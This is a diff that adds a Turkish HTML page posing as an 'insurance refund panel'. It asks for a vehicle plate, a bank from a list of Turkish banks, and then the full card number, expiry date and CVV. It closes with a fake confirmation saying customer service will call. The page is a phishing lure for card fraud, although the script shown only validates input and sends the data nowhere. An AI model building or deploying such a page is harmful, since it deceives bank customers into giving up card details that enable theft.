@@ -1,0 +1,249 @@
+<!doctype html>
+<html lang="tr">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>SİGORTA İADE PANELİ - Onay Ekranı</title>
+  <style>
+    :root{
+      --bg:#f4f6f8;
+      --panel:#fff;
+      --primary:#2563eb;
+      --muted:#6b7280;
+      --success:#16a34a;
+    }
+    *{box-sizing:border-box}
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background: var(--bg);
+      margin: 0;
+      padding: 20px;
+      display: flex;
+      justify-content: center;
+      align-items: flex-start;
+      min-height: 100vh;
+    }
+    .panel {
+      background: var(--panel);
+      margin-top: 20px;
+      padding: 20px;
+      border-radius: 12px;
+      box-shadow: 0 6px 22px rgba(16,24,40,0.08);
+      width: 420px;
+      position: relative;
+    }
+    h1 { font-size: 18px; text-align: center; color: #0f172a; margin-bottom: 8px; }
+    h2 { font-size: 15px; margin-top: 14px; color: #374151; border-bottom: 1px solid #e5e7eb; padding-bottom: 6px; }
+    label { font-weight: 600; display: block; margin-bottom: 6px; font-size: 14px; color:#0f172a; }
+    input[type="text"], select {
+      width: 100%;
+      padding: 10px;
+      border-radius: 8px;
+      border: 1px solid #d1d5db;
+      margin-bottom: 12px;
+      font-size: 14px;
+      background: white;
+    }
+    .row { display:flex; gap:8px; }
+    .row .half { flex:1; }
+    button {
+      width: 100%;
+      padding: 10px;
+      border: none;
+      border-radius: 8px;
+      background: var(--primary);
+      color: white;
+      font-weight: 600;
+      cursor: pointer;
+      margin-top: 6px;
+    }
+    button.secondary { background:#6b7280; }
+    button:disabled { opacity: 0.6; cursor: not-allowed; }
+    .msg { font-size: 13px; text-align: center; margin-top: 10px; color:var(--muted); }
+    .error { color: #dc2626; }
+    .card-section { display: none; margin-top: 16px; animation: fadeIn 0.25s ease; }
+    @keyframes fadeIn { from {opacity:0; transform:translateY(6px);} to {opacity:1; transform:translateY(0);} }
+    /* Onay overlay */
+    .confirm {
+      display: none;
+      position: absolute;
+      inset: 0;
+      background: rgba(255,255,255,0.98);
+      border-radius: 12px;
+      padding: 26px;
+      text-align: center;
+      z-index: 30;
+      box-shadow: 0 10px 30px rgba(2,6,23,0.15);
+    }
+    .confirm img {
+      width: 92px;
+      height: 92px;
+      object-fit: contain;
+      margin-bottom: 14px;
+      border-radius: 12px;
+    }
+    .confirm h3 { margin: 6px 0 8px 0; color: #0f172a; font-size:16px; }
+    .confirm p { color: var(--muted); font-size:14px; margin:0 0 14px 0; }
+  </style>
+</head>
+<body>
+  <div class="panel" role="region" aria-label="Bilgi giriş paneli">
+    <h1>SİGORTA İADESİ İÇİN BİLGİLERİ DOLDURUN</h1>
+
+    <!-- 1. bölüm -->
+    <h2>Seçtiğiniz kartınıza iadesi yapılacaktır</h2>
+    <label for="plaka">Araç Plakası</label>
+    <input type="text" id="plaka" placeholder="Örnek: 34 AB 1234" maxlength="12" autocomplete="off">
+
+    <!-- 2. bölüm -->
+    <h2>Tüm Bankalar</h2>
+    <label for="banka">Ödeme Yaptığınız Bankayı Seçiniz</label>
+    <select id="banka" aria-label="Banka seçimi">
+      <option value="">-- Banka Seçin --</option>
+      <option>Ziraat Bankası</option>
+      <option>VakıfBank</option>
+      <option>Halkbank</option>
+      <option>İş Bankası</option>
+      <option>Garanti BBVA</option>
+      <option>Akbank</option>
+      <option>Yapı Kredi</option>
+      <option>QNB Finansbank</option>
+      <option>DenizBank</option>
+      <option>TEB</option>
+      <option>Şekerbank</option>
+      <option>ING Bank</option>
+      <option>Kuveyt Türk</option>
+      <option>Albaraka Türk</option>
+      <option>Ziraat Katılım</option>
+      <option>Vakıf Katılım</option>
+      <option>Türkiye Finans</option>
+    </select>
+
+    <button id="gonder">Devam</button>
+    <div id="mesaj" class="msg" aria-live="polite"></div>
+
+    <!-- Kart bilgisi bölümü -->
+    <div id="kartSection" class="card-section" aria-hidden="true">
+      <h2>İade yapılacak kart bilgisini giriniz</h2>
+
+      <label for="cardNumber">Kart Numarası (16 haneli)</label>
+      <input id="cardNumber" type="text" maxlength="19" placeholder="1234 5678 9012 3456" autocomplete="off">
+
+      <div class="row">
+        <div class="half">
+          <label for="expiry">Son Kullanım (MM/YY)</label>
+          <input id="expiry" type="text" maxlength="5" placeholder="MM/YY" autocomplete="off">
+        </div>
+        <div class="half">
+          <label for="cvv">CVV</label>
+          <input id="cvv" type="text" maxlength="3" placeholder="123" autocomplete="off">
+        </div>
+      </div>
+
+      <button id="kartGonder">İade İşlemini Başlat</button>
+      <button id="kartGeri" class="secondary" style="margin-top:8px;">Geri</button>
+      <div id="kartMesaj" class="msg" aria-live="polite"></div>
+    </div>
+
+    <!-- Onay ekranı -->
+    <div id="confirm" class="confirm" role="dialog" aria-modal="true" aria-hidden="true">
+      <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQHeY7yO0fy4lB4dXPLPV2Lo9qyr9nW91iSJA&s" alt="Onay ikonu">
+      <h3>İşleminiz Tamamlandı</h3>
+      <p>İşleminiz tamamlanmıştır, müşteri hizmetlerinden arama gelecektir.</p>
+      <button id="yeni" style="max-width:260px; margin: 8px auto 0; display:block;">ANA EKRANA DÖN</button>
+    </div>
+
+  </div>
+
+  <script>
+    function onlyDigits(s){ return s.replace(/\D/g,''); }
+
+    const gonderBtn = document.getElementById('gonder');
+    const mesaj = document.getElementById('mesaj');
+    const kartSection = document.getElementById('kartSection');
+    const kartGonder = document.getElementById('kartGonder');
+    const kartGeri = document.getElementById('kartGeri');
+    const confirm = document.getElementById('confirm');
+    const yeniBtn = document.getElementById('yeni');
+
+    gonderBtn.addEventListener('click', () => {
+      mesaj.textContent = '';
+      const plaka = document.getElementById('plaka').value.trim();
+      const banka = document.getElementById('banka').value;
+
+      if (!plaka && !banka) {
+        mesaj.textContent = "Lütfen plaka yazın veya banka seçin.";
+        mesaj.className = "msg error";
+        return;
+      }
+
+      kartSection.style.display = "block";
+      kartSection.setAttribute('aria-hidden','false');
+      gonderBtn.disabled = true;
+      document.getElementById('plaka').disabled = true;
+      document.getElementById('banka').disabled = true;
+      document.getElementById('cardNumber').focus();
+      mesaj.textContent = "";
+    });
+
+    kartGonder.addEventListener('click', () => {
+      const card = onlyDigits(document.getElementById('cardNumber').value);
+      const exp = document.getElementById('expiry').value.trim();
+      const cvv = onlyDigits(document.getElementById('cvv').value);
+
+      if (card.length < 12 || exp.length < 4 || cvv.length < 3) {
+        document.getElementById('kartMesaj').textContent = "Lütfen tüm alanları doldurun.";
+        document.getElementById('kartMesaj').className = "msg error";
+        return;
+      }
+
+      confirm.style.display = 'block';
+      confirm.setAttribute('aria-hidden','false');
+
+      document.getElementById('cardNumber').disabled = true;
+      document.getElementById('expiry').disabled = true;
+      document.getElementById('cvv').disabled = true;
+      kartGonder.disabled = true;
+      kartGeri.disabled = true;
+
+      document.getElementById('kartMesaj').textContent = '';
+    });
+
+    kartGeri.addEventListener('click', () => {
+      kartSection.style.display = "none";
+      kartSection.setAttribute('aria-hidden','true');
+      gonderBtn.disabled = false;
+      document.getElementById('plaka').disabled = false;
+      document.getElementById('banka').disabled = false;
+      document.getElementById('kartMesaj').textContent = '';
+      document.getElementById('mesaj').textContent = '';
+    });
+
+    yeniBtn.addEventListener('click', () => {
+      confirm.style.display = 'none';
+      confirm.setAttribute('aria-hidden','true');
+
+      document.getElementById('plaka').value = '';
+      document.getElementById('banka').value = '';
+      document.getElementById('cardNumber').value = '';
+      document.getElementById('expiry').value = '';
+      document.getElementById('cvv').value = '';
+
+      document.getElementById('cardNumber').disabled = false;
+      document.getElementById('expiry').disabled = false;
+      document.getElementById('cvv').disabled = false;
+      kartGonder.disabled = false;
+      kartGeri.disabled = false;
+      gonderBtn.disabled = false;
+      document.getElementById('plaka').disabled = false;
+      document.getElementById('banka').disabled = false;
+
+      kartSection.style.display = "none";
+      kartSection.setAttribute('aria-hidden','true');
+
+      document.getElementById('kartMesaj').textContent = '';
+      document.getElementById('mesaj').textContent = '';
+    });
+  </script>
+</body>
+</html>
